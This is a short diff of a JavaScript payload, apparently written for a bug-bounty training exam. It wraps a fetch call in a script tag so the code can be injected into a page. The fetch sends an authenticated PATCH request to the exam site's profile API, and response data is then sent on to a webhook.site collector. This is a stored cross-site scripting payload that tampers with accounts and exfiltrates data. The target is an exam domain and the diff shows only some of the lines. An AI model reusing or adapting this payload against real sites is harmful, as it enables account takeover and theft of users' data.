@@ -1,4 +1,7 @@
-fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
+<script>
+    const webhook = "https://webhook.site/e0ddef86-5a1f-472e-a42c-9612ab165efe";
+    
+    fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
         method: "PATCH",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -23,3 +26,4 @@ fetch("https://api-bugbounty-exam.hashacademy.co/api/auth/profile", {
             body: JSON.stringify(data)
         });
     });
+</script>
